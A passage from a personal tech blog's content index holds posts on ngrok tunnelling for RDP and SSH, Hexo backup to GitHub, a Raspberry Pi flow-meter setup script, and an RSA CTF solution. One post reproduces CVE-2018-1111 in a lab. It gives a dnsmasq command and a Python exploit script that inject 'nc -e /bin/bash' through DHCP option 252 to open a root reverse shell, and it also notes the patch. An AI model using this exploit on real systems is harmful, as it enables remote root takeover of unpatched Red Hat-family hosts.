50087:50087 -p 50088:50088 -p 50089:50089 -p 50090:50090 -p 50091:50091 -p 50092:50092 -p 50093:50093 -p 50094:50094 -p 50095:50095 -p 50096:50096 -p 50097:50097 -p 50098:50098 -p 50099:50099 -p 50100:50100 -e DOMAIN=&#39;&lt; your domain &gt;&#39; hteen/ngrok /bin/sh /server.sh</code></pre><p>it’s too fool,you can use other to replace it</p><pre><code>docker run -idt --name ngrok-server -v /data/ngrok:/myfiles -p 80:80 -p 443:443 -p 4443:4443 -p 50000-50200:50000-50200 -e DOMAIN=&#39;&lt; your domain &gt;&#39; hteen/ngrok /bin/sh /server.sh</code></pre><p>there is something you should be notice.The ports number can’t be too much,I try to open 10000 ports,1000ports,all failed.In the end,I choose 200.</p><h2 id="And-a-dns"><a href="#And-a-dns" class="headerlink" title="And a dns"></a>And a dns</h2><p>in your Domain provider to add two records.<br><img src="/img/2018/05/23/dns1.png" alt="dns1"><br><img src="/img/2018/05/23/dns2.png" alt="dns2"></p><h1 id="USE-mstsc"><a href="#USE-mstsc" class="headerlink" title="USE mstsc"></a>USE mstsc</h1><p>In step 2,we will find a folder bin in /data/ngork/,those are the program to connect to our server.<br>Download them and choose what fit your OS<br>there are linux_x64,win_x64<br>for other,you should use there commands</p><pre><code>sudo GOOS=windowsGOARCH=i386 make release-server release-clientsudo GOOS=darwin GOARCH=i386 make release-server release-client</code></pre><p>create a file named <code>ngork.cfg</code></p><pre><code>server_addr: &quot;&lt; your domain &gt;:4443&quot;trust_host_root_certs: falsetunnels:    ssh:       remote_port: 50001       proto:         tcp: &quot;127.0.0.1:22&quot;    mstsc:        remote_port: 50002        proto:         tcp: &quot;127.0.0.2:3389&quot;    web:     subdomain: &quot;web&quot;     proto:       http: 80</code></pre><p>there are two way to use:</p><h3 id="fit-for-web"><a href="#fit-for-web" class="headerlink" title="fit for web:"></a>fit for web:</h3><pre><code>#Linux:./ngrok -config ./ngrok.cfg -subdomain wechat ip:80#Windows:ngrok -config ./ngrok.cfg -subdomain wechat ip:80</code></pre><p>it is easy to assign the domain,BUT !!! it’t can’t be used in tcp</p><h3 id="other"><a href="#other" class="headerlink" title="other"></a>other</h3><pre><code>#winngrok -config ngrok.cfg start mstsc#linux./ngrok -config ngrok.cfg start ssh</code></pre><p>maybe you should see,in mstsc,I use <code>127.0.0.2</code> and in ssh I use <code>127.0.0.1</code></p><p>the reason for it is we can’t mstsc 127.0.0.1 when is os higher than winxp,but we can use 127.0.0.2,127.0.0.3….<br>but linux can ssh 127.0.0.1<br><img src="/img/2018/05/23/mstsc_error.png" alt="mstsc_error"></p><p>The other thing for ngork is add a user,and add it to mstsc groud.Modify the max connections for rdp.In the end,<br>use ngork start the program and mstsc the computer.</p><p><img src="/img/2018/05/23/mstsc_add.png" alt="mstsc_add"><br><img src="/img/2018/05/23/mstsc_addtogroup.png" alt="mstsc_addtogroup"><br><img src="/img/2018/05/23/mstsc_modify.png" alt="mstsc_modify"><br><img src="/img/2018/05/23/mstsc_modify_connections.png" alt="mstsc_modify_connections"></p><p>Go!Than I can use the ESXI anywhere with out school vpn.</p><h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">nohup</span> ngrok -log<span class="token operator">=</span>stdout 80 <span class="token operator">></span> /dev/null <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> smalltrick </category>
          
      </categories>
      
      
        <tags>
            
            <tag> esxi </tag>
            
            <tag> ngrok </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cve-2018-1111</title>
      <link href="/2018/05/20/cve-2018-1111/"/>
      <url>/2018/05/20/cve-2018-1111/</url>
      
        <content type="html"><![CDATA[<p>Recently, Red Hat has released a security update that fixes a remote code execution flaw numbered CVE-2018-1111. An attacker can send a response packet to a fake DHCP server to attack the Red Hat system, get root privileges, and execute arbitrary commands.</p><a id="more"></a><h1 id="Reappearance"><a href="#Reappearance" class="headerlink" title="Reappearance"></a>Reappearance</h1><h2 id="environment"><a href="#environment" class="headerlink" title="environment"></a>environment</h2><p>kali x64<br>centos 7<br>vmware14</p><h2 id="Setting-Network"><a href="#Setting-Network" class="headerlink" title="Setting Network"></a>Setting Network</h2><p>Disconnect the networks of kali and centos<br>Set both kali and centos to host-only mode and turn off the host’s dhcp function<br><img src="/img/2018/05/20/netsetting.png" alt="netsetting"></p><h2 id="Configure-kali"><a href="#Configure-kali" class="headerlink" title="Configure kali"></a>Configure kali</h2><p>Configure kali’s ip and add the route</p><pre><code>ifconfig eth0 192.168.131.52 netmask 255.255.255.0route add default gw 192.168.131.52</code></pre><p>Use nc to monitor port 1314</p><pre><code>nc -l -p 1314 -v</code></pre><p>touch a file named dnsmasq.conf,content is</p><pre><code>bind-interfaces interface=eth0 except-interface=lo dhcp-range=192.168.131.10,192.168.131.30,22h dhcp-option=3,192.168.131.52 dhcp-option=6,192.168.131.52 log-queries log-facility=/var/log/dnsmasq.log</code></pre><p>Using dnsmasq to forge dns servers</p><pre><code>dnsmasq -dC dnsmasq.conf --dhcp-option=&quot;252,&#39;&amp;nc -e /bin/bash 192.168.131.52 1314 #&quot;</code></pre><p><img src="/img/2018/05/20/attack_command.png" alt="attack_command"></p><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><p>Let Centos connects to the network and finds the ip address gived by kali<br><img src="/img/2018/05/20/centos_ip.png" alt="centos_ip"></p><p>Now,in kali,nc getshell of centos,and for root privileges<br><img src="/img/2018/05/20/getshell.png" alt="getshell"></p><h1 id="Principle"><a href="#Principle" class="headerlink" title="Principle"></a>Principle</h1><p>The principle has been publish by 360 at <a href="https://www.anquanke.com/post/id/145201">360</a><br>Single quotation marks escaped in the script, execute the script directly with root privileges</p><blockquote><p>–dhcp-option=”252,x’&amp;nc -e /bin/bash 10.1.1.1 1337 #”</p></blockquote><h1 id="Range"><a href="#Range" class="headerlink" title="Range"></a>Range</h1><p>In locat,test fedora28,centos7 passed,centos6,redhat5 game over</p><h1 id="Fixed"><a href="#Fixed" class="headerlink" title="Fixed"></a>Fixed</h1><pre><code>yum update dhclient </code></pre><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#/usr/bin/python</span><span class="token comment" spellcheck="true">#encoding = utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> os<span class="token keyword">import</span> sys<span class="token keyword">import</span> time<span class="token comment" spellcheck="true"># author : xyzz</span><span class="token comment" spellcheck="true"># time : 20180520</span>ip<span class="token operator">=</span><span class="token string">'192.168.131.52'</span>port<span class="token operator">=</span><span class="token number">1314</span><span class="token comment" spellcheck="true"># context.log_level='debug'</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">:</span>    f<span class="token operator">=</span>open<span class="token punctuation">(</span><span class="token string">'dnsmasq.conf'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span>    start <span class="token operator">=</span> ip<span class="token punctuation">[</span><span class="token punctuation">:</span>ip<span class="token punctuation">.</span>rfind<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'.10'</span>    end <span class="token operator">=</span> ip<span class="token punctuation">[</span><span class="token punctuation">:</span>ip<span class="token punctuation">.</span>rfind<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'.30'</span>    dnsmasq <span class="token operator">=</span> <span class="token triple-quoted-string string">'''bind-interfaces interface=eth0 except-interface=lo dhcp-range=&amp;#123;start&amp;#125;,&amp;#123;end&amp;#125;,22h dhcp-option=3,&amp;#123;ip&amp;#125; dhcp-option=6,&amp;#123;ip&amp;#125; log-queries log-facility=/var/log/dnsmasq.log'''</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>ip<span class="token operator">=</span>ip<span class="token punctuation">,</span>start<span class="token operator">=</span>start<span class="token punctuation">,</span>end<span class="token operator">=</span>end<span class="token punctuation">)</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>dnsmasq<span class="token punctuation">)</span>    f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    cm<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    cm<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'ifconfig eth0 &amp;#123;ip&amp;#125; netmask 255.255.255.0 '</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>ip<span class="token operator">=</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span>    cm<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'route add default gw &amp;#123;ip&amp;#125;'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>ip<span class="token operator">=</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span>    cm<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''dnsmasq -dC dnsmasq.conf --dhcp-option="252,'&amp;nc -e /bin/bash &amp;#123;ip&amp;#125; &amp;#123;port&amp;#125; #"'''</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>ip<span class="token operator">=</span>ip<span class="token punctuation">,</span>port<span class="token operator">=</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>    q<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'bash'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>cm<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        q<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>cm<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># time.sleep(100)</span>    p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'bash'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'nc -l -p &amp;#123;port&amp;#125; -v'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>port<span class="token operator">=</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>    q<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>cm<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># q.interactive()</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    pwn<span class="token punctuation">(</span>ip<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/img/2018/05/20/exp.png" alt="exp"></p><p>Last at last!Congratulations to my Queen 520 for pleasure<del>~</del></p>]]></content>
      
      
      <categories>
          
          <category> cve </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dns </tag>
            
            <tag> cve </tag>
            
            <tag> rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>synchronize the hexo with github</title>
      <link href="/2018/05/19/synchronize-the-hexo-with-github/"/>
      <url>/2018/05/19/synchronize-the-hexo-with-github/</url>
      
        <content type="html"><![CDATA[<p>Recently I move my blog from vps to github with hexo.It’s first time to use hexo.It’s good but I have a question with how to deal with write my blog in different computer.The code of hexo to deploy in github is not with the source code.With the google,I found a really method.<br>In baidu,all method is say to create a branch to save the code.I don’t like it.I want to create a private repository.</p><a id="more"></a><p>Let’s go!</p><h1 id="BACK-UP"><a href="#BACK-UP" class="headerlink" title="BACK_UP"></a>BACK_UP</h1><h2 id="create-a-private-repository-in-github"><a href="#create-a-private-repository-in-github" class="headerlink" title="create a private repository in github"></a>create a private repository in github</h2><p>nothing to say.</p><h2 id="create-a-local-repository"><a href="#create-a-local-repository" class="headerlink" title="create a local repository"></a>create a local repository</h2><p>go to you blog folder,delete all gits of themes.</p><pre><code>rm -rf ./themes/*/.git/</code></pre><p>create a local git repository</p><pre><code>git init</code></pre><p>create a file named .gitignore,put it in the root of blog.content is </p><pre><code>.DS_StoreThumbs.dbdb.json*.lognode_modules/public/.deploy*/</code></pre><p>than create a file name CNAME in source,content is your domain.</p><h2 id="push-it-to-your-private-repository"><a href="#push-it-to-your-private-repository" class="headerlink" title="push it to your private repository"></a>push it to your private repository</h2><pre><code>git remote add origin https://github.com/&lt;yourname&gt;/myblog.gitgit add .git commit -m &quot;myblog&quot;git push -u origin master</code></pre><p>all the backup is over</p><h1 id="write-in-other-computer"><a href="#write-in-other-computer" class="headerlink" title="write in other computer"></a>write in other computer</h1><h2 id="build-the-environment"><a href="#build-the-environment" class="headerlink" title="build the environment"></a>build the environment</h2><p>install node.js and git  </p><h3 id="install-hexo"><a href="#install-hexo" class="headerlink" title="install hexo"></a>install hexo</h3><p>create folder name hexo and go to it</p><pre><code>npm install -g hexo</code></pre><h2 id="pull-your-blog"><a href="#pull-your-blog" class="headerlink" title="pull your blog"></a>pull your blog</h2><pre><code>git clone https://github.com/&lt;yourname&gt;/myblog.git</code></pre><h2 id="write-a-new-article"><a href="#write-a-new-article" class="headerlink" title="write a new article"></a>write a new article</h2><p>init the hexo environment<br>WARRING!!! DON’T USE <code>hexo init</code>,because the hexo init will rewrite your blog.<br>USE:</p><pre><code>npm install</code></pre><p>the create a new article</p><pre><code>hexo new &quot;test&quot;</code></pre><h2 id="push-it-to-github-and-publish"><a href="#push-it-to-github-and-publish" class="headerlink" title="push it to github and publish"></a>push it to github and publish</h2><p>publish it to hexo</p><pre><code>hexo cleanhexo ghexo shexo d</code></pre><p>push it to github</p><pre><code>git statusgit add .git commitgit push</code></pre><h1 id="update-the-hexo"><a href="#update-the-hexo" class="headerlink" title="update  the hexo"></a>update  the hexo</h1><p>exec these commands to update the hexo</p><pre><code>git fetch -all # pull all files from github to locatgit reset --hard origin/master #Force local content to just sync git cloud content</code></pre><p>the reason for don’t use pull is there are many files in local.Reset does nothing to the file being pulled.Use pull may take some mistake because of the target.</p><p>END!<br>ENjoy the github!</p>]]></content>
      
      
      <categories>
          
          <category> smalltrick </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Flow meter</title>
      <link href="/2018/05/19/flow-meter/"/>
      <url>/2018/05/19/flow-meter/</url>
      
        <content type="html"><![CDATA[<p>All is build in Raspberry Pi 3b</p><p>this is a bash for Raspberry Pi to get a gpio python php mysql and open i2c-0</p><a id="more"></a><pre class="line-numbers language-bash"><code class="language-bash">pi.sh<span class="token comment" spellcheck="true">#sudo mv /etc/apt/sources.list /etc/apt/sources.list.bak;</span><span class="token comment" spellcheck="true">#sudo echo "deb http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ jessie main non-free contrib">>/etc/apt/sources.list.d/raspi.list;</span><span class="token comment" spellcheck="true">#sudo echo "deb-src http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ jessie main non-free contrib">>/etc/apt/sources.list.d/raspi.list;</span><span class="token function">sudo</span> <span class="token function">apt-get</span> update<span class="token punctuation">;</span><span class="token function">sudo</span> <span class="token function">apt-get</span> upgrade -y<span class="token punctuation">;</span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> vim apache2 zsh <span class="token function">htop</span> php5 -y<span class="token punctuation">;</span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> tightvncserver -y<span class="token punctuation">;</span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> xrdp -y<span class="token punctuation">;</span><span class="token comment" spellcheck="true">#sudo service ufw restart;</span><span class="token function">sudo</span> <span class="token function">service</span> xrdp restart<span class="token punctuation">;</span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> mysql-server mysql-client -y<span class="token punctuation">;</span><span class="token function">sudo</span> <span class="token function">apt-get</span> -y <span class="token function">install</span> php5-mcrypt php5-curl php5-cli php5-mysql php5-gd php5-intl php5-xsl<span class="token punctuation">;</span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> python-smbus -y<span class="token punctuation">;</span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> libi2c-dev -y<span class="token punctuation">;</span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> i2c-tools -y<span class="token punctuation">;</span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> libmysqlclient-dev python-dev -y<span class="token punctuation">;</span><span class="token function">sudo</span> pip <span class="token function">install</span> -i https://pypi.tuna.tsinghua.edu.cn/simple MySQL-python Adafruit-GPIO<span class="token punctuation">;</span><span class="token function">sudo</span> <span class="token keyword">echo</span> <span class="token string">"device_tree=bcm2710-rpi-3-b.dtb"</span><span class="token operator">>></span>/boot/config.txt<span class="token punctuation">;</span><span class="token function">sudo</span> <span class="token keyword">echo</span> <span class="token string">"dtparam=i2c_arm=on"</span><span class="token operator">>></span>/boot/config.txt<span class="token punctuation">;</span><span class="token function">sudo</span> <span class="token keyword">echo</span> <span class="token string">"dtparam=i2c1=on"</span><span class="token operator">>></span>/boot/config.txt<span class="token punctuation">;</span><span class="token function">sudo</span> <span class="token keyword">echo</span> <span class="token string">"dtparam=i2c0=on"</span><span class="token operator">>></span>/boot/config.txt<span class="token punctuation">;</span><span class="token function">sudo</span> <span class="token keyword">echo</span> <span class="token string">"dtparam=i2c_vc=on"</span><span class="token operator">>></span>/boot/config.txt<span class="token punctuation">;</span><span class="token function">sudo</span> <span class="token keyword">echo</span> <span class="token string">"dtparam=spi=on"</span><span class="token operator">>></span>/boot/config.txt<span class="token punctuation">;</span><span class="token comment" spellcheck="true">#i2c-0;</span><span class="token function">sudo</span> <span class="token function">rm</span> /var/www/html/index.html<span class="token punctuation">;</span><span class="token function">sudo</span> <span class="token function">cp</span> -r ./html /var/www<span class="token punctuation">;</span><span class="token function">sudo</span> <span class="token function">cp</span> -r ./over ~/<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>git clone the source code and make it in right path</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/chnxyzz/Raspberry-Pi-for-Flow-meter.git<span class="token function">cd</span> Raspberry-Pi-for-Flow-meter<span class="token function">sudo</span> <span class="token function">su</span><span class="token function">chmod</span> +x pi.sh./pi.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>we should create a database and source the tables;</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">cd</span> <span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>htmlmysql <span class="token operator">-</span>u root <span class="token operator">-</span>p<span class="token keyword">create</span> <span class="token keyword">database</span> qiti<span class="token punctuation">;</span>source <span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>qiti<span class="token punctuation">.</span>sql<span class="token punctuation">;</span><span class="token keyword">exit</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Do reboot<br>Than you can see it in <a href="http://ip/">http://ip/</a>;<br>Over!!!</p>]]></content>
      
      
      <categories>
          
          <category> smalltrick </category>
          
      </categories>
      
      
        <tags>
            
            <tag> raspberry pi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rsa_combinations</title>
      <link href="/2018/05/17/rsa-combinations/"/>
      <url>/2018/05/17/rsa-combinations/</url>
      
        <content type="html"><![CDATA[<p>15号做的，算是迁移博客后的第一篇吧</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#! /usr/bin/python2.7</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> size<span class="token punctuation">,</span>bytes_to_long<span class="token punctuation">,</span>getStrongPrime<span class="token keyword">from</span> itertools <span class="token keyword">import</span> combinationsmsg <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span><span class="token string">"Your secret flag is : flag&amp;#123;**************************&amp;#125;"</span><span class="token punctuation">)</span>e <span class="token operator">=</span> <span class="token number">65537</span>pri <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>f <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'cipherx.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    pri<span class="token punctuation">.</span>append<span class="token punctuation">(</span>getStrongPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">,</span><span class="token number">65537</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'pri'</span><span class="token punctuation">,</span>pri<span class="token punctuation">)</span><span class="token keyword">for</span> k <span class="token keyword">in</span> combinations<span class="token punctuation">(</span>pri<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    n <span class="token operator">=</span> k<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> k<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">print</span> k<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>str<span class="token punctuation">(</span>pow<span class="token punctuation">(</span>msg<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由5个1024bit的强素数进行两两组合一共生成10组密文如下：</p><a id="more"></a><pre class="line-numbers language-python"><code class="language-python"><span class="token number">13455981172983326464102311937762831661788310626361076786164994487793945326981111197066703467784063584677545316464486222690177319997065759168374653040496712059568682406584202721616582863702654975066950060466986422582257001703187853927809075825528343329091775200012208860563692058684819775698290978617780577594014210672865880497874392738697086445744342656347507587613428993075257255547029724259635931665971785614738909042286207279739603543188892504358133043289264464915763121424437513688474543252743250750837754962444189265768058493217120380229238478428390747580847275659398491959011425398794606200760449574140326761335</span><span class="token number">4888187708328317620094507614800274226981107085929590254185425273559042976171503907943793194842845890835133406885671925681517347731439124039971268535772441389943526257018243714512592593512323296725941627631582840937936230289732464068819395084847503736153991018426601148001171410680610396315398455868476519242523364370643315263903656899707643857165005292144961418736390628879183534554050946402008748537061851428674751948379857099827888766867529291843558247067650218013841320566949128247840292451599528568785840031947044173916230774125850838571273228740235067857273673072775479606479505558411747622879981674961795496398</span><span class="token number">1246234818568605038771725387770032809896657624658751197487822667705150496788266236821445252745402061440344837126297118817722352360943422714353348519968257483217425318287123603122559539044278216514618542935008251728016376351207287908907419066172027356649934716661853550169371283110451199593919378518682893908073257597996213276417788967527409800490507319098619694553882580772197585922179030322385772341029003564359719244782484762058530989277184051441547024568631595655539528137422918541855814336215841836541683256179952847812650782272979437883178787135567291812430132598562391722110607279005808604132547633446702754242</span><span class="token number">5945807707085423616106397090464145288661224101014907693104654596081518092031824289580553655597136400293583390581989219838293858796303129177903562794487009660324129992480484791256849653177916440709763357317237732026978876936371843211238777064330897077782446698577278202922221650609784909136488983753316374328060041688862833502261386605214386656750469198595184961624056503168436674528338454488445689162595307651649338939926811181397583426347049799471037024928424365956074689363634987714880064366326557578148205795406310315807810873199906864220949509516643869325208494504730147145059516579980994124490343208766447536810</span><span class="token number">6187445948828077692015970911804646938282242052772994916845077569070730070453969382819385152870562813549652542234501650247554999118997287612656768657169917874500360552882579507148077964788035519927189184337650311696041346297615679489279371787315665879866086591715868260088943256008041145891355773432381271043597673424658569516927545882320343535771872720945022165744462740208023473214182506701311573606230422976998106293803156552098142853857635121713770388765373265153557740921629496699557717987765469270646934300913295007513219413849883613183601728166411181113787689840581266359785250985019212532583960800460788015491</span><span class="token number">5212091418073782411520553214182135709421767268933861097557470068670598830761237108296366132955527825989098372862689616150847719971020880914262684813844505249039731390296288313064277036616294317850242554242344468349017823603991546642546139312359635120516022621977198868713265236780584328968456455227210401242292651898111573896055644196069499504205254423973191477361052269017513569237003435455766967610384127786317357129201800175882818678442257638418605140567086462026872695510406713566416179338847089594383139719544078973639147656333759205784973323451162915648440751084782358602950098354039646328692181357908591122714</span><span class="token number">3655638351649160392053613377223998746456935081525685917833104279800461813163792301601632928836306436302774882558931553763046873854372645433876037722220899647761264466458772539363592772806366025160060082392022496959043608616479633871824843539139765269866557324139669669180299880464960812373747543711884223811204173243558307161330834607275612285093379360358536623915157494256701984991891771698584900549732277659667805289723868414345078895913383480318010760628083474820289670382156241646315278789987701943251698483519785588242374214684684812447667402223553085547756490931266818022366894997520489636576763520143455761239</span><span class="token number">22473849661397275053996298243554884261414191820929237708168650853330395912319504073426952208513086627198829384154042315234052506082911684608144173835091410795393615116386997884885069683405033389454289189585622646957977150864405507253019700368456175153569120706431504842630017193823414614613515543944012768438615372135192092455771020625920899643657460748140525123446385745452885018242994907719060418829076821951353655094288932417789785658686354925401717179930381179237133075628900875416109603229568575866141143927588631408100548721530988132959911381450682687082674104687988294384311340599275049224252503713916928373410</span><span class="token number">1873513506226622659558980965960349556051601818636390593699111238742079235436048735742501009666517921834732172263333584189891447981830661750295791445758897570358691214228971207469306988655891013882209331385427955502522192570359268476079812111160032458293920218131883616683323041237563743943563895577660520218905767619038915659113775800791354119111094458073436219216055603238833113774387249183198627105364934918297190119325269494891789384314242315970885073496066247057106399028140269736234473860608631980241965505615924442715413658175017031374265609800935996459163053296259788980765102199701839555511572730799034774424</span><span class="token number">20415066745705913332960559851272168836161858864856687615100156867932858500059203383582659999680270947712850092591947365553338831150848535525568756863490320019679102804007709747313186252161566229585999657772047185972884107522202907260488147758131548047735509416576778951156037782507571965765760567109821746219259712533369530160331404056822935924868818144471996283443950605787104623265573763097577017088633658357190202370173046308936352735690024216178434559387107878752418634566838258964132836294305792991271935081972613859675575909742688564959474926073661839487937083301362266785004789397144843903897244356681794196480</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>解法：<br>$$c1 \equiv {m^e}\pmod{n1 \cdot n2}$$<br>$$c2 \equiv {m^e}\pmod{n1 \cdot n3}$$<br>$$c3 \equiv {m^e}\pmod{n1 \cdot n4}$$<br>由1-2，3-2得：<br>$${c1-c2} = {k1 \cdot n1 \cdot ({n2-n3} )}$$<br>$${c3-c2} = {k1 \cdot n1 \cdot ({n4-n3} )}$$<br>这样就得到了一个公因数n1,再随便出一个公因数2就搞定了<br>数字的选择就在里面挑几个就行了，小数被减就ok，别出现负数<br>代码：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#! usr/bin/python2.7</span><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">import</span> binascii<span class="token keyword">import</span> gmpy2<span class="token keyword">def</span> <span class="token function">gcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> a <span class="token operator">&lt;</span> b<span class="token punctuation">:</span>        a<span class="token punctuation">,</span> b <span class="token operator">=</span> b<span class="token punctuation">,</span> a    <span class="token keyword">while</span> b <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>        temp <span class="token operator">=</span> a <span class="token operator">%</span> b        a <span class="token operator">=</span> b        b <span class="token operator">=</span> temp    <span class="token keyword">return</span> a<span class="token keyword">def</span> <span class="token function">egcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> a <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token 